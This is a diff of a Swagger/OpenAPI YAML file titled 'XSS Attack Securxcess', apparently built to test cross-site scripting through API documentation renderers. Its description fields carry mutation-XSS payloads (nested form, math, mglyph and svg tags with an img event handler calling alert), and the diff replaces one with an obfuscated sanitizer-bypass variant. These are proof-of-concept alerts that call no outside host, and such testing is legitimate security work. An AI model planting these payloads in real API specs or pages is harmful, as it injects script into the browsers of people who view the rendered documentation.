@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack Securxcess
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><img src=x onmouseover=alert(document.domain)></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext>"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><img src=x onmouseover=alert(document.domain)></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext>"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\></form>
 
           format: int64
           in: path
